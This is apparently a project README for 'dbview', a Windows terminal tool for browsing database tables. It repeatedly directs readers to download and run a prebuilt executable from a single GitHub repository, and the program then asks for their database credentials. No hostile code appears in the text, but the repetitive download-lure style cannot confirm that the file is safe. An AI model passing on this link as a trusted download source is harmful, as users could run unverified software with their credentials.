# 🗂️ dbview - View Databases From Terminal

[![Download dbview](https://img.shields.io/badge/Download-dbview-blue?style=for-the-badge)](https://github.com/cadanga8927/dbview)

## 📥 Download dbview

Use this link to visit the download page:

[https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)

On that page, look for the latest Windows release and download the file for your system.

## 🪟 Windows Setup

dbview runs in a terminal window on Windows. It is built for people who want to look at database tables without opening a full database tool.

### What you need
- Windows 10 or Windows 11
- A terminal app such as Command Prompt, PowerShell, or Windows Terminal
- Access to the database you want to view
- A database account, host name, port, user name, and password if your database needs them

### How to install
1. Open the download page: [https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
2. Find the latest release for Windows
3. Download the `.exe` file or the Windows archive file
4. If you downloaded a `.zip` file, extract it to a folder
5. Keep the `dbview` file in a place you can find again, such as `Downloads` or `Desktop`

### How to start
1. Open Command Prompt or PowerShell
2. Go to the folder where you saved `dbview`
3. Run the program
4. Type the database details when asked

Example:
- `dbview`

If the file does not open, right-click it and choose to run it again from a terminal window.

## 🧭 What dbview does

dbview lets you look at database data in a simple terminal screen. You can move through tables, read rows, and check values without switching to a heavy desktop app.

It works with:
- SQLite
- MySQL
- MariaDB
- PostgreSQL
- CockroachDB
- MSSQL
- MongoDB
- Redis
- Cassandra

## ⚙️ Basic use

After you start dbview, it asks for connection details for your database.

Common details:
- Database type
- Host name
- Port number
- Database name
- User name
- Password

For local databases, you may only need a file path or a local address. For remote databases, make sure your network allows access to the server.

### Typical flow
1. Open dbview
2. Pick your database type
3. Enter the connection details
4. Browse the tables or collections
5. Open a table to see rows
6. Move through the data with the keyboard

## ⌨️ Keyboard use

dbview is made for keyboard use in a terminal.

Common actions:
- Arrow keys to move up and down
- Enter to open a table or item
- Backspace to go back
- Page Up and Page Down to move faster
- Tab to switch between fields or panels
- Q to quit

If your terminal does not respond as expected, click inside the terminal window first.

## 🗃️ Supported database types

### SQL databases
- SQLite
- MySQL
- MariaDB
- PostgreSQL
- CockroachDB
- MSSQL

### NoSQL and key-value databases
- MongoDB
- Redis
- Cassandra

This makes dbview useful when you work with more than one kind of database and want one tool for quick checks.

## 🔍 Common things you can do

dbview is useful for everyday database viewing tasks:

- Check if a table has data
- Read records without writing queries
- Compare values across rows
- Inspect database names and table lists
- Review data on a remote server
- Look at test data during setup
- Verify changes after an update

## 🧩 Example Windows folder setup

A simple setup can look like this:

- `Downloads\dbview\`
- `Downloads\dbview\dbview.exe`

You can also place it in:

- `C:\Tools\dbview\`
- `Desktop\dbview\`

Keep it in a folder with a short path. That makes it easier to open from the terminal.

## 🛠️ If the terminal closes right away

If dbview opens and closes fast, start it from an open terminal.

1. Open PowerShell
2. Go to the dbview folder
3. Run `dbview`

That keeps the window open so you can see any messages.

## 🌐 Working with remote databases

If you connect to a server on another machine, check these items:
- The server is online
- The host name or IP address is correct
- The port is open
- Your user name and password are correct
- Your database account has read access

If the database sits behind a firewall or VPN, connect to that network first.

## 📁 Working with local files

For SQLite, dbview may use a local database file. In that case:
- Find the `.db`, `.sqlite`, or similar file
- Make sure the file is not in use by another app
- Open it from dbview when asked

A local file is a good choice for small projects, test data, and offline use.

## 🧪 Simple first test

If you want to try dbview for the first time, use a database you already know.

Try this:
1. Start dbview
2. Connect to a local or test database
3. Open the first table or collection
4. Scroll through the rows
5. Check that the data matches what you expect

If you can see rows and field names, the app is working.

## 🔐 Common login details

You may need:
- Host
- Port
- Database name
- User name
- Password

Some systems may also ask for:
- SSL settings
- File path
- Schema name
- Instance name

Use the same values you use in your other database tools.

## 🧼 Good folder habits

To keep setup simple:
- Save the app in one folder
- Avoid spaces in the folder name if you can
- Keep your database file in a known place
- Save notes with the host and port for each server

This helps when you return later and need to connect again.

## ❓ Common problems

### I cannot find the file
Check your `Downloads` folder and look for the latest release file from the GitHub page.

### The app does not open
Try opening it from PowerShell or Command Prompt instead of double-clicking it.

### I cannot connect to the database
Check the host, port, user name, password, and network access.

### I see empty tables
Make sure you opened the right database and the right table.

### The screen looks odd
Resize the terminal window or make the font smaller so more columns fit on screen.

## 📌 Quick start

1. Visit [https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
2. Download the latest Windows file
3. Extract it if needed
4. Open PowerShell or Command Prompt
5. Run `dbview`
6. Enter your database details
7. Browse your tables and records